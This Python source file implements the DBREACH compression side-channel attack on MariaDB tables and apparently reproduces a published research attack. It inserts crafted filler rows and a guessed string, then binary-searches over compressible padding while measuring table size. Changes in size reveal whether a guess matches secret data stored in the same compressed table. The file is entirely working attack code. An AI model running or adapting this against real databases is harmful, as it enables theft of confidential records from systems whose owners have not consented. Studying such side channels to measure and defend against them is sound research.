import os
import random
import time

import utils.mariadb_utils as utils
import dbreacher

COMP_BASE = int(os.getenv("DBREACH_COMP_BASE", "2048"))
PHASE_SPAN = int(os.getenv("DBREACH_PHASE_SPAN", "2048"))
MAX_PHASE_BYTES = PHASE_SPAN * 3

class DBREACHerImpl(dbreacher.DBREACHer):
    def __init__(self, controller : utils.MariaDBController, tablename : str, startIdx : int, maxRowSize: int, fillerCharSet : set, compressCharAscii : int):
        dbreacher.DBREACHer.__init__(self, controller, tablename, startIdx, maxRowSize, fillerCharSet, compressCharAscii)
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0
        self.rowsAdded = 0 
        self.rowsChanged = [False, False, False, False]
        self.fillersInserted = False
        self.db_count = 0
        self.previously_shrunk = False

    def _clear_fillers(self):
        if self.rowsAdded <= 0:
            return
        for row in range(self.startIdx, self.startIdx + self.rowsAdded):
            self.control.delete_row(self.table, row)
            self.db_count += 1
        self.rowsAdded = 0
        self.rowsChanged = [False, False, False, False]
        self.fillersInserted = False

    def reinsertFillers(self) -> bool:
        self.compressibilityScoreReady = False
        if self.fillersInserted:
            self._clear_fillers()

        self.bytesShrunkForCurrentGuess = 0
        self.fillers = [''.join(random.choices(self.fillerCharSet, k=self.maxRowSize)) for _ in range(self.numFillerRows)]
        return self.insertFillers()

    # return True if successful
    def insertFillers(self) -> bool:
        self.fillersInserted = False
        oldSize = self.control.get_table_size(self.table)
        print(f"[SETUP] insertFillers START: oldSize={oldSize}")

        # guess를 넣는 앵커 행(완전 랜덤)
        self.control.insert_row(self.table, self.startIdx, self.fillers[0])
        self.db_count += 1
        self.rowsAdded = 1
        newSize = self.control.get_table_size(self.table)
        print(f"[SETUP] after first filler: newSize={newSize}, rowsAdded={self.rowsAdded}")

        if newSize > oldSize:
            print("[SETUP][WARN] table grew before fillers fully placed; retrying")
            return False

        compression_bootstrapper = utils.get_compressible_str(COMP_BASE, char=self.compressChar)
        i = 1
        boundary_hit = False
        while i < len(self.fillers):
            filler_payload = compression_bootstrapper + self.fillers[i][COMP_BASE:]
            self.control.insert_row(self.table, self.startIdx + i, filler_payload)
            self.db_count += 1
            newSize = self.control.get_table_size(self.table)
            # 필요 이상 로그 폭증을 막기 위해 초기/간격만 출력
            if i <= 5 or i % 25 == 0:
                print(f"[SETUP] filler row {self.startIdx + i} inserted, newSize={newSize}")
            self.rowsAdded += 1
            if newSize > oldSize:
                print(f"[SETUP] row {self.startIdx + i} triggered growth (old={oldSize}, new={newSize}); stopping here")
                boundary_hit = True
                break
            i += 1

        if self.rowsAdded < 4 or not boundary_hit:
            print(f"[SETUP][FAIL] unable to hit boundary (rowsAdded={self.rowsAdded}, boundary_hit={boundary_hit}); rolling back fillers")
            self._clear_fillers()
            return False

        self.rowsChanged = [False, False, False, False]
        final_size = self.control.get_table_size(self.table)
        print(f"[SETUP] insertFillers DONE: rowsAdded={self.rowsAdded}, finalSize={final_size}")
        self.fillersInserted = True
        return True

    def insertGuessAndCheckIfShrunk(self, guess : str) -> bool:
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0
        self.previously_shrunk = False

        if self.rowsChanged[0]:
            self.control.update_row(self.table, self.startIdx, self.fillers[0])
            self.db_count += 1
            self.rowsChanged[0] = False
        compression_bootstrapper = utils.get_compressible_str(COMP_BASE, char = self.compressChar)
        for i in range(1, 4):
            if self.rowsChanged[i]:
                self.rowsChanged[i] = False
                self.control.update_row(self.table, self.startIdx + self.rowsAdded - i, compression_bootstrapper + self.fillers[self.rowsAdded - i][COMP_BASE:])
                self.db_count += 1
        
        old_size = self.control.get_table_size(self.table)
        new_first_row = guess + self.fillers[0][len(guess):]
        if new_first_row != self.fillers[0]:
            self.control.update_row(self.table, self.startIdx, new_first_row)
            self.db_count += 1
            self.rowsChanged[0] = True
        new_size = self.control.get_table_size(self.table)
        return new_size < old_size

    def getSNoReferenceScore(self, length : int, charSet) -> float:
        refGuess = ''.join(random.choices(charSet, k=length)) 
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            raise RuntimeError("Table shrunk too early on insertion of guess")
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess)
        if self.getBytesShrunkForCurrentGuess() == PHASE_SPAN:
            shrunk = False
            while not shrunk:
                shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess, PHASE_SPAN, PHASE_SPAN * 2)
        if self.getBytesShrunkForCurrentGuess() == PHASE_SPAN * 2:
            shrunk = False
            while not shrunk:
                shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess, PHASE_SPAN * 2, MAX_PHASE_BYTES)
        return self.getBytesShrunkForCurrentGuess()

    # raises RuntimeError if table shrinks prematurely
    def getSYesReferenceScore(self, length : int) -> float:
        refGuess = self.fillers[1][COMP_BASE:][:length]
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            raise RuntimeError("Table shrunk too early on insertion of guess")
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess)
        return self.getBytesShrunkForCurrentGuess()
    
    def addCompressibleByteAndCheckIfShrunk(self, refGuess, lowBytes=0, highBytes=PHASE_SPAN) -> bool:
        lo, hi = lowBytes, highBytes
        ans = None
        while lo <= hi:
            mid = (lo + hi) // 2
            self.bytesShrunkForCurrentGuess = mid
            shrunk = self.checkIfShrunk(mid)  # True면 mid 이상에서 shrink 발생
            if shrunk:
                ans = mid
                hi = mid - 1
            else:
                lo = mid + 1

        # ans가 None이면 highBytes까지도 shrink가 안 났다는 뜻
        # 논문 호환: highBytes를 반환 (k_of_n_attacker가 == 100으로 체크함)
        self.bytesShrunkForCurrentGuess = ans if ans is not None else highBytes
        self.compressibilityScoreReady = True
        print(f"[BINSEARCH] final answer: {self.bytesShrunkForCurrentGuess} bytes")
        return True  # "탐색 완료" 의미  

    def checkIfShrunk(self, bytesShrunkForCurrentGuess) -> bool:
        old_size = self.control.get_table_size(self.table)

        # phase 1: rowsAdded-1, base COMP_BASE + [0..PHASE_SPAN]
        if bytesShrunkForCurrentGuess <= PHASE_SPAN:
            self.rowsChanged[1] = True
            inc = COMP_BASE + bytesShrunkForCurrentGuess
            row = self.startIdx + self.rowsAdded - 1
            phase = 1

        # phase 2: rowsAdded-2, base COMP_BASE + [1..PHASE_SPAN]
        elif bytesShrunkForCurrentGuess <= PHASE_SPAN * 2:
            self.rowsChanged[2] = True
            inc = COMP_BASE + (bytesShrunkForCurrentGuess - PHASE_SPAN)
            row = self.startIdx + self.rowsAdded - 2
            phase = 2

        # phase 3: rowsAdded-3, base COMP_BASE + [1..PHASE_SPAN]
        elif bytesShrunkForCurrentGuess <= MAX_PHASE_BYTES:
            self.rowsChanged[3] = True
            inc = COMP_BASE + (bytesShrunkForCurrentGuess - PHASE_SPAN * 2)
            row = self.startIdx + self.rowsAdded - 3
            phase = 3

        else:
            raise RuntimeError(f"bytesShrunkForCurrentGuess out of range: {bytesShrunkForCurrentGuess}")

        # 압축 문자열 생성 및 업데이트
        compress_str = utils.get_compressible_str(inc, char=self.compressChar)
        filler_idx = row - self.startIdx
        self.control.update_row(self.table, row, compress_str + self.fillers[filler_idx][len(compress_str):])
        self.db_count += 1

        new_size = self.control.get_table_size(self.table)
        shrunk = new_size < old_size

        print(f"[DEBUG] bytes={bytesShrunkForCurrentGuess}, phase={phase}, inc={inc}, old_size={old_size}, new_size={new_size}, shrunk={shrunk}")

        if shrunk:
            self.compressibilityScoreReady = True
            self.previously_shrunk = True
        else:
            self.previously_shrunk = False

        return shrunk

    def getCompressibilityScoreOfCurrentGuess(self) -> float:
        if not self.compressibilityScoreReady or self.bytesShrunkForCurrentGuess <= 0:
            return 0.0
        return 1.0 / float(self.bytesShrunkForCurrentGuess)

    def getBytesShrunkForCurrentGuess(self) -> int:
        if self.compressibilityScoreReady:
            return self.bytesShrunkForCurrentGuess
        else:
            return None
